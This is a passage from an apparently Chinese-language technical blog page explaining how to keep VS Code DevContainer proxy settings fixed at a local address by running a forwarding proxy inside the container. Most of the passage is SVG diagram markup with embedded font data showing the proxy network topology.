.text-mono-bold{font-family:'d2-3235089245-font-mono-bold'}@font-face{font-family:d2-3235089245-font-mono-bold;src:url(data:application/font-woff;base64,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)}@font-face{font-family:d2-3235089245-font-mono-italic;src:url(data:application/font-woff;base64,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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-3235089245 .fill-N1{fill:#000410}.d2-3235089245 .fill-B6{fill:#fff}.d2-3235089245 .stroke-B1{stroke:#000410}.dots-overlay{fill:url(#dots);mix-blend-mode:multiply}</style><defs><pattern id="dots" width="15" height="15" x="0" y="0" patternUnits="userSpaceOnUse"><path fill="#0A0F25" d="M2 2h1v1H2zM12 2h1v1h-1zM12 12h1v1h-1zM2 12h1v1H2zM2 7h1v1H2zM12 7h1v1h-1zM7 2h1v1H7zM7 12h1v1H7zM7 7h1v1H7z" opacity=".1" style="mix-blend-mode:multiply"/></pattern></defs><g id="local"><g class="shape"><path fill="#FFF" stroke="#000410" d="M0 147h92v66H0z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="46" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">LOCAL</text></g><g id="badproxy"><g class="shape"><path fill="#FFF" stroke="red" d="M192 139h196v82H192z" class="fill-B6" style="stroke-width:2"/></g><text x="290" y="177.5" fill="red" class="text-mono-bold" style="text-anchor:middle;font-size:16px"><tspan x="290" dy="0">HTTP://192.168.</tspan><tspan x="290" dy="18.5">9.100:11451(BAD)</tspan></text></g><g id="remote"><g class="shape"><path stroke="#000410" d="M528 76h345v197H528z" class="stroke-B1" style="fill:#e7e9ee;stroke-width:2"/><path d="M528 76h345v197H528z" class="dots-overlay" style="stroke-width:2"/><path fill="transparent" stroke="#000410" d="M533 81h335v187H533z" class="stroke-B1" style="stroke-width:2"/></g><text x="700.5" y="63" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:28px">REMOTE SERVER</text></g><g id="proxy"><g class="shape"><path fill="#FFF" stroke="#000410" d="M1020 147h293v66h-293z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="1166.5" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">HTTP://192.168.9.100:11451</text></g><g id="remote.docker"><g class="shape"><path stroke="#000410" d="M558 117h285v126H558z" class="stroke-B1" style="fill:#f5f6f9;stroke-width:2"/><path d="M558 117h285v126H558z" class="dots-overlay" style="stroke-width:2"/></g><text x="700.5" y="105" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:24px">DOCKER</text></g><g id="remote.docker.code"><g class="shape"><path fill="#FFF" stroke="#000410" d="M588 147h225v66H588z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="700.5" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">VS CODE (CONTAINER)</text></g><g id="(local -&gt; badproxy)[0]"><marker id="mk-1222543834" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path fill="red" stroke-width="2" d="m0 0 10 6-10 6z" class="connection"/></marker><path fill="none" stroke="red" marker-end="url(#mk-1222543834)" d="M94 180h94" class="connection" mask="url(#d2-3235089245)" style="stroke-width:2"/></g><path id="(badproxy -&gt; remote.docker.code)[0]" fill="none" stroke="red" marker-end="url(#mk-1222543834)" d="M390 180h194" class="connection" mask="url(#d2-3235089245)" style="stroke-width:2"/><g id="(remote.docker.code -&gt; proxy)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#000410"/></marker><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M815 180h201.5" class="connection stroke-B1" mask="url(#d2-3235089245)" style="stroke-width:2"/><text x="916.5" y="186" style="font-family:'d2-3235089245-font-mono-italic';fill:#0000b8;text-anchor:middle;font-size:16px">?</text></g><mask id="d2-3235089245" width="1315" height="239" x="-1" y="35" maskUnits="userSpaceOnUse"><path fill="#fff" d="M-1 35h1315v239H-1z"/><path fill="rgba(0,0,0,0.75)" d="M22.5 169.5h47v21h-47zM214.5 161.5h151v37h-151zM592.5 35h216v36h-216zM1042.5 169.5h248v21h-248zM658 81h85v31h-85zM610.5 169.5h180v21h-180z"/><path d="M913 170h7v21h-7z"/></mask></svg></svg></figure><p >既然如此，我们必须保持 <code>http.proxy</code> 始终为 <code>http://127.0.0.1:1081</code>，从而需要在 DevContainer 内部另架设一个转发代理，网络拓扑如下</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="742" height="179" preserveAspectRatio="xMinYMin meet" viewBox="0 0 1060 255"><svg id="d2-svg" width="1060" height="255" class="d2-1236139595" viewBox="-1 35 1060 255"><rect width="1060" height="255" x="-1" y="35" stroke-width="0" rx="0" style="fill:#fff"/><style>.d2-1236139595 .text-mono{font-family:'d2-1236139595-font-mono'}@font-face{font-family:d2-1236139595-font-mono;src:url(data:application/font-woff;base64,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